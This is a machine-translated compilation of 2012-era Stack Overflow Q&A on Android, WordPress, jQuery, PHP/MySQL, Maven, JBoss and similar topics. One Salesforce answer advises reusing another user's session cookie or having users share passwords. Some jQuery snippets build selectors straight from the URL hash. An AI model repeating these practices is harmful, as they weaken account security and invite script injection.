Facebook 每次都会缓存 css，每次您进行更改时都会在 css 的 url 上附加一个不同的查询字符串，它会获取它。这是一个帮助我做同样事情的指南[http://www.daddydesign.com/wordpress/how-to-customize-your-facebook-fan-box/](http://www.daddydesign.com/wordpress/how-to-customize-your-facebook-fan-box/)

# android - Android tesseract OCR, jni :received a nullstring in Lcom/googlecode/tesseract/android/TessBaseAPI

> ID：10102791
> 
> 赞同：0
> 
> 时间：2012-04-11T08:54:20.257
> 
> 标签：android, ocr, tesseract

tesseract-android-tools-test（测试项目以确保一切设置正确）有效。我的 eng.traindeddata 来自：[http](http://tesseract-ocr.googlecode.com/files/eng.traineddata.gz) ://tesseract-ocr.googlecode.com/files/eng.traineddata.gz (http://code.google.com/p/tesseract-ocr/wiki/ReadMe) 但我尝试运行我自己的路径时仍然会出现上述错误，这只是初始化它......这就是我到目前为止所做的一切。有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-16T20:05:00.187

您需要将 eng.traineddata（解压缩）放在文件夹中的 tessdata 目录中 -

/mnt/sdcard/tessdata/eng.traineddata

然后，将路径作为 /mnt/sdcard/ 提供给您的 init 调用。'tessdata' 由库添加..

```
public class TesseractApp extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        File sdcard = Environment.getExternalStorageDirectory();
        File from = new File(sdcard, "Pic.jpg");
        TessBaseAPI api = new TessBaseAPI();
        api.init("/mnt/sdcard/", "eng");
        api.setImage(from);
        Log.d("OCR", api.getUTF8Text());
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:08:27.423

好的，即使文档声明您可以将 init 称为 tesseract.init(PATH, **null** ) 然后您不能这样做。确保使用“eng”或您要“解释”的语言来调用它。

# mysql - 安装完成后更改wordpress表前缀？

> ID：10102792
> 
> 赞同：2
> 
> 时间：2012-04-11T08:54:20.327
> 
> 标签：mysql, wordpress

安装完成后，如果更改 wordpress 表前缀有任何问题，谁能告诉我。

我正在开发我的 wordpress 网站，我想更改我的表前缀以使其更安全一些。

如果我去 wp-config.php 并更改我的前缀，它会破坏我当前的安装 - 还是会自动更新数据库？

```
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_'; 
```

我对数据库不是很好，我想知道在我改变这个之后是否需要运行查询......

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T09:03:13.510

仅通过更改 wp_config.php 中的前缀，它不会自动工作。这是该过程的一部分，但您也需要进行一些数据库更改。

在进行任何更改之前进行备份以防止灾难。按照[Wordpress Codex 中的说明进行操作](http://codex.wordpress.org/Changing_The_Site_URL#Altering_Table_Prefixes)。或者，如果您需要有关流程细节的帮助，请按照[此演练进行操作。](http://tdot-blog.com/wordpress/6-simple-steps-to-change-your-table-prefix-in-wordpress)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T08:58:51.803

首先备份数据库（当然），但只要数据库中的表与前缀匹配就可以了。即，如果您重命名了所有表 wp4_tablename 然后在配置文件中更改该前缀值将起作用。如果您只是更改 config 中的前缀而不更改您的实际表名，这将破坏您的站点。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2017-01-31T20:39:25.803

有一个插件可以帮助您轻松更改您的 wordpress 表前缀名称。

第 1 步：备份您的数据库表或所有内容。

第二步：安装 Wordpress 插件：[https ://wordpress.org/plugins/db-prefix-change/](https://wordpress.org/plugins/db-prefix-change/)

# sql-server - ColdFusion - SQL 执行时间因应用程序而异

> ID：10102796
> 
> 赞同：1
> 
> 时间：2012-04-11T08:54:44.353
> 
> 标签：sql-server, coldfusion

我在一个 ColdFusion 安装下运行 2 个单独的站点/应用程序。

SQL 语句的执行时间根据它们运行的​​站点而有所不同。

例如，如果我运行以下 SQL Server 命令：

```
DBCC USEROPTIONS 
```

站点 1 始终在 0 或 1 毫秒内执行：

![在此处输入图像描述](../Images/5bdd2bbf84dd50899c0647952b89888a.png)

站点 2 始终在大约 20 毫秒内执行：

![在此处输入图像描述](../Images/3b1d8decd728c29e06051fea7a1e9aac.png)

两个站点都使用在 CFIDE 管理员中设置的相同 CF 数据源。

还有什么可以解释我看到的变化？

谢谢，斯图

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T13:23:56.690

好的 - 我想我已经找到了原因。

在站点 1 示例中，另一个数据库查询在我的测试查询之前运行。

在站点 2 示例中，测试查询是第一个运行的。

大概额外的毫秒只是数据库连接设置开销。

谜团已揭开。不是我正在寻找的确凿证据。

# iphone - 保护随 iPhone 应用程序分发的数据

> ID：10102799
> 
> 赞同：1
> 
> 时间：2012-04-11T08:55:04.430
> 
> 标签：iphone, ios, encryption, ssl, protection

我有一个通过 SSL 与 Web 服务对话的 iPhone 应用程序。我想与应用程序一起分发一个密钥，该应用程序可以用来向 Web 服务标识自己（一个应用程序密钥）。所有应用程序都可以使用相同的密钥，因此我可以为每个应用程序分配相同的密钥。

我怎样才能以一种保护它不被应用程序以外的任何东西发现或使用的方式分发它？

我正在使用带有 SQLite 数据库的 Core Data。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:22:24.270

您可以使用 iOS 钥匙串机制。谷歌以获取更多信息，或查看[`SFHFKeychainUtils`](https://github.com/ldandersen/scifihifi-iphone/tree/master/security)Buzz Andersen 的小班课程，它使处理钥匙链变得非常容易。

如果您担心 iOS 钥匙串提供的“真正”安全性，请阅读[这篇非常有趣的 SO 文章](https://stackoverflow.com/questions/3558252/ios-keychain-security)。

# jdbc - Hive - Jdbc 与 Thrift 客户端 - 使用哪一个？

> ID：10102800
> 
> 赞同：0
> 
> 时间：2012-04-11T08:55:07.867
> 
> 标签：jdbc, hive

哪一个是通过 Java 连接到 Hive 的首选客户端 - JDBC 或 Thrift？或者他们是一样的？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T12:27:06.583

他们都通过节俭的服务器。所以在它下面并没有太大的区别。只是 JDBC 为您提供了类似 sql 的查询能力。

# jquery - 使用 if 语句将页面相关代码与 jQuery 分开是否有意义？

> ID：10102801
> 
> 赞同：1
> 
> 时间：2012-04-11T08:55:11.927
> 
> 标签：jquery, if-statement

只是在有意义的情况下徘徊，在 jquery 文档就绪函数中使用如下 if 语句，以确保仅在特定页面上触发脚本..

```
 if(window.location.href.indexOf("our-team")>= 0){
            if(window.location.hash) {
                var hash = window.location.hash;
                $('#teamMembers div:not('+hash+')').hide();
                $("#teamMenu .imgHolder").removeClass('active');
                $('a[href='+hash+']').closest(".imgHolder").addClass('active');
            }
            else {
                $('#teamMembers div:not(#member1)').hide();
            }
        } 
```

这可能不是很有效，但是如果当前页面在 url 中不包含 our-team，则 if 语句是停止脚本运行所必需的。

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:08:19.737

如果您不在这些项目不存在的页面上运行大量选择器操作，您将获得最佳性能。因此，如果通过检查 URL 或其他一些快速检查很容易过滤掉这些选择器操作，那么出于性能原因，这可能是可取的。

就个人而言，我更喜欢在 body 标记上使用类名来识别页面类型，而不是检查 URL。这意味着您更多的是寻找预期的内容，而不是内容的来源，如果管理站点的人决定更改 URL 布局或名称，您的代码将不会依赖于此。

```
if ($(document.body).hasClass("ourteam")) {
    if (window.location.hash) {
        var hash = window.location.hash;
        $('#teamMembers div:not('+hash+')').hide();
        $("#teamMenu .imgHolder").removeClass('active');
        $('a[href='+hash+']').closest(".imgHolder").addClass('active');
    } else {
        $('#teamMembers div:not(#member1)').hide();
    }
} 
```

从技术上讲，如果您使用的选择器都不存在于您不想处理的页面中，则不需要第一个 if 语句。但是在许多不适用的页面上运行 4-5 个额外的选择器操作效率不高。而且，如果每个页面在普通 JS 中都有这种类型的代码，因此它是 4-5 个操作 * 50 个页面，那么这将是很多浪费的选择器操作，并且会真正影响站点性能。您拥有的页面越多，您在另一个页面中重复选择器并发现一个页面中的 JS 也会意外影响另一个页面的机会就越大。

# android - 无法在 Android Market 上传 apk 文件

> ID：10102806
> 
> 赞同：1
> 
> 时间：2012-04-11T08:55:21.587
> 
> 标签：android, google-play

希望你们一切都好。

我想在 android 市场上传我的应用程序。但它显示一个错误

```
The certificate that signed this apk is not valid until the future.Create a new certificate. 
```

我按照以下步骤操作：Android 工具 > 导出签名的应用程序包

我的系统时间显示正确的时间任何人都可以帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T09:55:13.157

深入查看您的证书，并查看有效期何时开始（从错误消息开始，很可能在不久的将来）。然后要么：

*   确保您的计算机日期正确，（时区和所有），然后重试。
*   等到您的证书有效，然后再次上传您的应用程序

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T03:46:43.747

使用此代码：-

```
$ keytool -genkey -v -keystore my-release-key.keystore
-alias alias_name -keyalg RSA -keysize 2048 -validity 10000 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-18T20:30:03.083

我通过将系统时钟的日期更改为 -2 天解决了这个问题。然后我创建了一个具有相同参数的新证书。它工作得很好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T09:07:50.607

创建一个新的证书/签名密钥，你的旧的可能已经过期了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-11T09:11:37.803

查看发布市场应用程序的开发人员指南，您必须创建一个有效期**约为 25 年**的证书。可能您没有设置此参数并且您的证书已过期。

[http://developer.android.com/guide/publishing/app-signing.html#cert](http://developer.android.com/guide/publishing/app-signing.html#cert)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-13T04:53:42.040

我在两天前更改了我的系统日期，它正在工作。谢谢您的回复...

# php - PHP/MySQL 在各个页面上显示/订购附加信息

> ID：10102809
> 
> 赞同：0
> 
> 时间：2012-04-11T08:55:26.440
> 
> 标签：php, mysql

在我的页面中，我有一个内容块，我想在其中显示某些附加信息。多个页面的此信息可能相同，但项目也可以显示在一个特定项目上。

我正在考虑不同的方法，但在我看来，我所有的解决方案似乎都过于详尽，或者我无法想象没有更聪明的解决方案。

考虑下表（列名与我的原始数据库不同，我不在不同的表中使用相同的名称）我有内容。

```
fe_content:
+----+--------+----------+-------------------+
| id |  page  | pagelink |      content      |
+----+--------+----------+-------------------+
| 1  | page 1 |  page_1  | Content of page 1 |
| 2  | page 2 |  page_2  | Content of page 2 |
| 3  | page 3 |  page_3  | Content of page 3 |
| 4  | page 4 |  page_4  | Content of page 4 |
| 5  | page 5 |  page_5  | Content of page 5 |
+----+--------+----------+-------------------+ 
```

我对附加数据的方法是这样的：

```
fe_blocks:
+----+---------+-------+---------+----------+--------------------+
| id |  block  | order | display | pagelink |      content       |
+----+---------+-------+---------+----------+--------------------+
| 1  | block 1 |   1   | always  |          | Content of block 1 |
| 2  | block 2 |   2   | always  |          | Content of block 2 |
| 3  | block 3 |   1   | single  |  page_1  | Content of block 3 |
| 4  | block 4 |   3   | always  |          | Content of block 4 |
| 5  | block 5 |   4   | single  |  page_3  | Content of block 5 |
+----+---------+-------+---------+----------+--------------------+ 
```

所以现在，当我想显示页面时，我使用：

```
 $result = mysql_query("
    SELECT content
    FROM fe_content
    WHERE pagelink = '"._mysql_real_escape_string($_aGET[0])."'
") or die(mysql_error());
$show = mysql_fetch_assoc($result);
echo("<div> ".$show['content']." </div>\n\n<aside>\n");

$result = mysql_query("
    SELECT content
    FROM fe_blocks
    WHERE pagelink = '".mysql_real_escape_string($_aGET[0])."' or display = 'always'
    ORDER BY order ASC
") or die(mysql_error());
while($show = mysql_fetch_assoc($result)){
    echo("<p>".$show['content']."</p>\n");
}
echo("</aside>"); 
```

这给了我想要的块，但有一些障碍..

假设我请求`page_1`，我的输出将是

```
 <div> Content of page 1 </div>
<aside>
<p>Content of block 1</p>
<p>Content of block 2</p>
<p>Content of block 3</p>
<p>Content of block 4</p>
</aside> 
```

虽然我想得到这个：

```
 <div> Content of page 1 </div>
<aside>
<p>Content of block 3</p>
<p>Content of block 1</p>
<p>Content of block 2</p>
<p>Content of block 4</p>
</aside> 
```

我想要的结果考虑到：

*   *重要性。*在特定页面上显示的项目的顺序应该被认为比总是显示的项目的顺序更重要（例如否决）。
*   *几乎总是。*也许有些项目应该显示在几乎所有页面上，除了少数。对于将来的更改，在数据库中插入一个带有适当页面链接的新行是不方便的，每个页面应该显示块。

有人对这种情况有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:03:26.917

你有页面，你有块。如果您希望一个块显示在多个页面上，您应该创建一个新表来帮助您存储实体之间的 n:m 连接。那就是您将存储特定块在特定页面上的顺序的地方。基本上 - 标准化您的数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:05:26.053

像这样更改您的第二个查询语句，

```
$result = mysql_query("
SELECT content
FROM fe_blocks
WHERE pagelink = '".mysql_real_escape_string($_aGET[0])."' or display = 'always'
ORDER BY order ASC, display ASC ") or die(mysql_error()); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T09:01:10.030

您可以这样订购：

```
ORDER BY order ASC, display ASC 
```

所以订单号相同，“总是”在前面

或者如果您想更加重视“展示”

```
ORDER BY display ASC, order ASC 
```

# android - 在 Android 中下载文件

> ID：10102812
> 
> 赞同：5
> 
> 时间：2012-04-11T08:55:35.757
> 
> 标签：android, file, url, download

我正在使用以下代码在 Android 中下载文件：

```
public class FileDownloadActivity extends Activity {
    ProgressDialog mProgressDialog;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        mProgressDialog = new ProgressDialog(FileDownloadActivity.this);
        mProgressDialog.setMessage("Downlaoding File...");
        mProgressDialog.setIndeterminate(false);
        mProgressDialog.setMax(100);
        mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);

        // execute this when the downloader must be fired
        DownloadFile downloadFile = new DownloadFile();
        downloadFile.execute("http://code.google.com/android/goodies/wallpaper/android-wallpaper5_1024x768.jpg");   
    }

    private class DownloadFile extends AsyncTask<String, Integer, String> {
        @Override
        protected String doInBackground(String... sUrl) {
            try {
                Log.i("","In doin bggggggggggggg");
                URL url = new URL(sUrl[0]);
                URLConnection connection = url.openConnection();
                connection.connect();

                // this will be useful so that you can show a typical 0-100% progress bar
                int fileLength = connection.getContentLength();
                // download the file
                InputStream input = new BufferedInputStream(url.openStream());
                OutputStream output = new FileOutputStream("/sdcard/sample.jpg");
                byte data[] = new byte[1024];
                long total = 0;
                int count;
                while ((count = input.read(data)) != -1) {
                    total += count;
                    // publishing the progress....
                    publishProgress((int) (total * 100 / fileLength));
                    output.write(data, 0, count);
                }
                output.flush();
                output.close();
                input.close();
            } catch (Exception e) {

            }
            return null;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            mProgressDialog.show();
        }

        @Override  
        protected void onProgressUpdate(Integer... progress) {
            super.onProgressUpdate(progress);
            mProgressDialog.setProgress(progress[0]);
        }
    }
} 
```

这只是向我显示过去半小时的 0% 进度。

我什至添加了

```
<uses-permission android:name="android.permission.INTERNET"></uses-permission>  
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"></uses-permission>  
<uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>  
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission> 
```

在清单中，甚至互联网在我的手机中都可以正常工作。

请帮忙。

谢谢斯内哈
_

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T09:30:24.147

我的猜测是“connection.getContentLength()”在 HTTP 上不可靠并返回 0，因此您可能会得到除以零的异常。而且由于您没有记录异常，因此您在 Logcat 中看不到任何内容，也没有任何进展..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:30:45.047

如果您的最低 SDK 级别为 9，请查看[此类](http://developer.android.com/reference/android/app/DownloadManager.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-08T09:07:27.620

lib会帮助你

[https://github.com/AriaLyy/Aria](https://github.com/AriaLyy/Aria)

# 下载文件只有一个代码

```
Aria.download(this)
    .load(DOWNLOAD_URL)
    .setDownloadPath(DOWNLOAD_PATH) //file save path
    .add(); 
```

# 获取下载状态

```
@Download.onPre(DOWNLOAD_URL)
  protected void onPre(DownloadTask task) {}

  @Download.onTaskStart
  void taskStart(DownloadTask task) {}

  @Download.onTaskRunning
  protected void running(DownloadTask task) {}

  @Download.onTaskResume
  void taskResume(DownloadTask task) {}

  @Download.onTaskStop
  void taskStop(DownloadTask task) {}

  @Download.onTaskCancel
  void taskCancel(DownloadTask task) {}

  @Download.onTaskFail
  void taskFail(DownloadTask task) {}

  @Download.onTaskComplete
  void taskComplete(DownloadTask task) {}

  @Download.onNoSupportBreakPoint
  public void onNoSupportBreakPoint(DownloadTask task) {} 
```

# c# - 将数据放入 dataGridView

> ID：10102813
> 
> 赞同：3
> 
> 时间：2012-04-11T08:55:35.723
> 
> 标签：c#, mysql, web-services

问题是从我的 web 服务获取我的 dataGridView 中的数据。当我从 web 服务调用 getList 方法时，我得到了正确的 xml 代码。这是我的代码：网络服务：

```
[WebMethod]
    public DataSet getList()
    {
        SqlConnection connection = new SqlConnection();
        connection.ConnectionString = "server=localhost;" +
                                   "Trusted_Connection=yes;" +
                                   "database=oving1; " +
                                   "connection timeout=30";
        string select = "select * from Person";
        SqlDataAdapter da = new SqlDataAdapter(select, connection);
        DataSet ds = new DataSet();

        da.Fill(ds, "Person");
        return (ds);
    } 
```

形式：

```
 private void button1_Click(object sender, EventArgs e)
    {

        Service1 webService = new Service1();
        DataSet ds = webService.getList();
        dataGridView1.DataSource = ds;

    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T09:06:16.703

你最好检查一下这个[Avoiding DataSet in Web services](http://msdn.microsoft.com/en-us/magazine/cc188755.aspx#S4)

通过 Web 服务序列化数据集[从 XML Web 服务使用数据集](http://msdn.microsoft.com/en-us/library/s5xy331f%28v=vs.71%29.aspx)

另一件事尝试将数据表传递到网格而不是数据集：

```
dataGridView1.DataSource = ds.Tables[0]; 
```

# salesforce - Salesforce：使用 API 进行模拟

> ID：10102815
> 
> 赞同：1
> 
> 时间：2012-04-11T08:55:49.000
> 
> 标签：salesforce

我是 Salesforce 系统管理员，我想代表（即：模拟）属于我公司的 Salesforce 用户使用 Web 服务 API。

更准确地说，我正在寻找类似于 Google Docs 已经提供的功能：[https ://developers.google.com/google-apps/documents-list/#using_google_apps_administrative_access_to_impersonate_other_domain_users](https://developers.google.com/google-apps/documents-list/#using_google_apps_administrative_access_to_impersonate_other_domain_users)

这可以做到吗？

谢谢 ！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T01:43:30.413

执行此操作的唯一方法是使用其他用户的凭据通过 API 进行身份验证。这是一个无法避免的安全功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T01:42:08.580

如果您具有该用户的登录权限和检查浏览器 cookie 的工具，这应该是可能的。

当您以测试用户身份登录时，打开 cookie 浏览器并获取“sid”cookie 中的值。这是该用户的会话 ID，可以在 api 请求的标头中设置，而不是进行登录调用。

这个我没试过。此会话 ID 可能仅对浏览器有效，而对 API 无效。在这种情况下，您可能应该只创建一个具有相同个人资料和电子邮件的测试用户。如果一切都失败了，只需要求用户临时更改他们的密码并与您分享。

# jquery - 变量无法在头部外部获取

> ID：10102817
> 
> 赞同：1
> 
> 时间：2012-04-11T08:55:55.647
> 
> 标签：jquery, json

我对 JSON 和 jQuery 有点陌生。在这里，我想做的是从 JSON 中获取数据并将其显示在 html 表中。问题是当我写入`document.write(ht);`html`head`文件的部分时，一切正常。但是当我`document.write(ht);`像这样写入 html 正文时，它只会显示`undefined`为输出。我不知道为什么会这样。

以下是 text.json 文件：

```
 {
     "red":"new_small.gif",
     "green":"new_small.gif"
   } 
```

以下是html文件：

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
     <html xmlns="http://www.w3.org/1999/xhtml">
     <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <title>Untitled Document</title>
      <script src="jquery-1.7.2.js"></script>
      <script  type="text/javascript">
        var items = [];
        var ht;
        $.getJSON('text.json', function(data) {
        ht='<table>';
        $.each(data, function(key, val) {
        ht+= '<tr><td>' + key + '</td><td><img src="' + val+ '"></td></tr>';
       });
        ht+='</table>';
      }).success(function() { alert("success"); })
        .error(function() { alert("error"); })
        .complete(function() { alert("complete"); });  
    </script>
    </head>
    <body>
    <script> 
    document.write(ht);  
    </script>
    </body>
    </html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T09:00:16.813

`ht`通过调用中的回调函数异步设置`$.getJSON`，但您的 document.write 会立即触发。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T09:07:57.767

在 ht+='table>' 之后；用这个

```
  $('div/>', {
    html: ht
  }).appendTo('body');

```

# maven - Maven pom.properties 文件中的自定义值

> ID：10102818
> 
> 赞同：6
> 
> 时间：2012-04-11T08:55:56.023
> 
> 标签：maven, maven-3, pom.xml

我正在尝试在 Maven 在该`META-INF/maven/${groupId}/${artifactId}`位置生成的 pom.properties 文件中添加自定义值

```
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-jar-plugin</artifactId>
    <version>2.4</version>
    <configuration>
            <archive>
                <manifestEntries>
                    <build>${BUILD_TAG}</build>
                </manifestEntries>
                <addMavenDescriptor>true</addMavenDescriptor>
                <pomPropertiesFile>${project.build.directory}\interface.properties</pomPropertiesFile>
            </archive>
    </configuration>
</plugin> 
```

interface.properties 文件的内容是

```
# Build Properties
buildId=746 
```

使用[文档](http://maven.apache.org/shared/maven-archiver/#pom-properties-content)我已将`pomPropertiesFile`元素指向外部属性，但生成的 pom.properties 文件在运行后仍然具有默认内容`mvn install`

`pomPropertiesFile`元素的正确用法是什么？

编辑

我相信问题出在 org.apache.maven.archiver.PomPropertiesUtil 上。如果您查看[源代码](http://svn.apache.org/viewvc/maven/shared/tags/maven-archiver-2.5/src/main/java/org/apache/maven/archiver/PomPropertiesUtil.java?view=markup)`sameContents`中的方法，如果外部文件中的属性与默认值相同，则返回 true；如果不同，则返回 false。如果结果为假，则忽略外部文件的内容。`sameContents`

果然，这已经被[记录](http://jira.codehaus.org/browse/MSHARED-154)为错误

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T12:43:49.110

我认为您需要在 src/main/resources/META-INF/${groupId}/${artifactId}/interface.properties 下放置一个文件，然后让 maven 进行过滤工作（配置过滤）。该文件将自动复制到 target/META-INF/maven/${groupId}/${artifactId}/ 位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-13T08:36:59.320

请参阅[https://issues.apache.org/jira/browse/MNG-4998](https://issues.apache.org/jira/browse/MNG-4998)

Maven 3 将在读取 pom.xml 以获取此时可用的所有属性值时急切地解析属性占位符。以后修改这些属性不会影响 pom.xml 中已经解析的值。

但是，如果属性值不可用（没有默认值），则占位符不会被该值替换，并且以后仍然可以作为占位符处理。例如，如果插件将在构建期间生成一些属性，或者如果占位符在某个构建步骤中由插件读取和处理。

# c++ - 如何从 XSD cxx 树对象写入 XML 文件？

> ID：10102823
> 
> 赞同：1
> 
> 时间：2012-04-11T08:56:46.083
> 
> 标签：c++, xml, xsd, xerces-c, codesynthesis

我正在使用一个库，该库使用 XSD 在 C++ 中从基于 XML 的格式创建对象。

基本上，继承图看起来像这样：

```
class BaseClass: public xsd::cxx::tree::type;
class MainXmlObject: public BaseClass; 
```

我想我需要将 my 转换`MainXmlObject`为 a`xerces::DOMDocument`然后用于`DOMWriter`编写实际的 XML 文件，但到目前为止我找不到正确的例程。

做这个的最好方式是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-24T22:12:40.817

似乎将`--add-serialization`标志添加到 xsd 代码生成中，然后使用类似：

```
xml_schema::namespace_infomap map;
//    map[""].name = "test"; // xmlns
//    map[""].schema = "http://sbgn.org/libsbgn/0.2"; // xsi:noNamespaceSchemaLocation
ofstream ofs(fname.c_str());
sbgn_(ofs, s, map); // invoking the stream here
ofs.close(); 
```

作品。参考：从[XSD 指南中](http://www.codesynthesis.com/projects/xsd/documentation/cxx/tree/guide/)[添加序列化](http://www.codesynthesis.com/projects/xsd/documentation/cxx/tree/guide/#2.5)和[详细信息](http://www.codesynthesis.com/projects/xsd/documentation/cxx/tree/guide/#6)。

# java - 无法在 Jboss AS 7 上定义 oracle 数据源

> ID：10102826
> 
> 赞同：5
> 
> 时间：2012-04-11T08:56:58.480
> 
> 标签：java, datasource, jboss7.x

我正在使用 Jboss AS 7.1.1.final，我正在尝试添加一个 oracle 数据源：

```
<datasource jndi-name="java:jboss/datasources/DefaultDS" 
            pool-name="DefaultDS" 
            enabled="true" 
            use-java-context="true">
    <connection-url>jdbc:oracle:oci@TNS_NAME</connection-url>
    <driver>oracle</driver>
    <security>
        <user-name>username</user-name>
        <password>pwd</password>
    </security>
</datasource> 
```

还有司机：

```
<driver name="oracle" module="com.oracle.ojdbc">
   <xa-datasource-class>oracle.jdbc.OracleDriver</xa-datasource-class>
</driver> 
```

但是当我启动服务器时，我得到：

```
JBAS014775:    New missing/unsatisfied dependencies:
  service jboss.jdbc-driver.oracle (missing) dependents: [service jboss.data-source.java:jboss/datasources/DefaultDS] 
```

我在 modules/com/oracle/ojdbc/main 下有一个模块：

```
<module xmlns="urn:jboss:module:1.0" name="com.Oracle.ojdbc">
    <resources>
        <resource-root path="ojdbc6.jar"/>
    </resources>
    <dependencies>
        <module name="javax.api"/>
    </dependencies>
</module> 
```

当然，罐子在那里。

有人可以告诉我我在这里做错了什么吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-09T12:50:28.977

添加此以定义驱动程序：对于 xa 数据源

```
<driver name="oracleDriver" module="com.oracle.ojdbc">
         <driver-class>oracle.jdbc.OracleDriver</driver-class>
         <xa-datasource-class>oracle.jdbc.xa.OracleXADataSource</xa-datasource-class>
</driver> 
```

对于非xa--------

```
<driver name="oracleDriver" module="com.oracle.ojdbc">
         <driver-class>oracle.jdbc.OracleDriver</driver-class>
    </driver> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-11T12:07:51.520

得到了答案：

在驱动程序部分，我将驱动程序定义为位于模块中`"com.oracle.ojdbc"`，但模块本身实际上是在“ **O racle”中用大写****“O”**定义的，所以它应该是**`"com.Oracle.ojdbc"`**

 *** * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-06-12T07:29:48.890

添加此以定义驱动程序：对于 xa 数据源

```
<driver name="oracleDriver" module="com.oracle.ojdbc">
         <driver-class>oracle.jdbc.OracleDriver</driver-class>
         <xa-datasource-class>oracle.jdbc.xa.OracleXADataSource 
```

对于非xa--------

```
<driver name="oracleDriver" module="com.oracle.ojdbc">
         <driver-class>oracle.jdbc.OracleDriver</driver-class>
    </driver> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-04-22T03:18:54.387

在我的例子中，ojdbc jar 的路径是：`D:\ProgramFiles\JBoss6.4\modules\com\oracle\jdbc7\main`其中 D:\ProgramFiles\JBoss6.4\ 是 JBOSS HOME 目录。

在主文件夹中，需要有以下文件。

```
ojdbc7.jar
module.xml 
```

模块的条目如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<module xmlns="urn:jboss:module:1.1" name="com.oracle.jdbc7">
<properties>
        <property name="jboss.api" value="unsupported"/>
    </properties>
 <resources>
 <resource-root path="ojdbc7.jar"/>
 </resources>
 <dependencies>
 <module name="javax.api"/>
 <module name="javax.transaction.api"/>
 <module name="javax.servlet.api" optional="true"/>
 </dependencies>
</module> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-23T12:47:36.760

您可以从管理界面定义数据源，在下面找到好的教程

[http://middlewaremagic.com/jboss/?p=350](http://middlewaremagic.com/jboss/?p=350)**

# iphone - iPad主细节UISplitView中的UITableViewCell不会自动响应方向变化

> ID：10102830
> 
> 赞同：1
> 
> 时间：2012-04-11T08:57:14.190
> 
> 标签：iphone, ios, ipad, xcode4, interface-builder

在 xcode 4.2 中，如果您为 iPhone 和 iPad 都设置了一个新项目并选择创建一个新的 iOS“主从应用程序”，Xcode 将为您设置很多模板代码。应用程序的 iOS“版本”有一个不同的更简单的故事板。我希望我的应用程序的详细视图也是由表控制器控制的表视图，并且我希望此表视图的单元格随着方向的变化自动调整大小。问题是，虽然这适用于 iPhone 版本的应用程序，但它不适用于 iPad 版本。

前置条件：

如果您在 iPhone 故事板上编辑详细视图，使其包含一个表格视图控制器并定义表格视图以包含单个原型单元格 - 将原型单元格设置为自定义类型并向其添加一些子视图，然后定义这些子视图具有自动调整大小属性（例如两个按钮 - 一个固定在视图的左侧，另一个固定在视图的右边距）。对 iPad 故事板的详细视图执行相同操作（当然，它包含在更复杂的拆分视图控制器排列中）。

仔细检查所有视图控制器都选择了从 NIB 调整视图大小（默认情况下），并且所有视图都选择了 Autoresize Subviews。

预期的：

当为 iPhone 或 iPad 编译应用程序时，在这两种情况下，表格单元格及其子视图都应根据方向更改调整大小。

实际结果：

在 iPad 版本的应用程序中，表格单元格不会重新布局以匹配 UITable 视图的更改大小。iPhone 版应用程序上的表格单元格按预期运行。

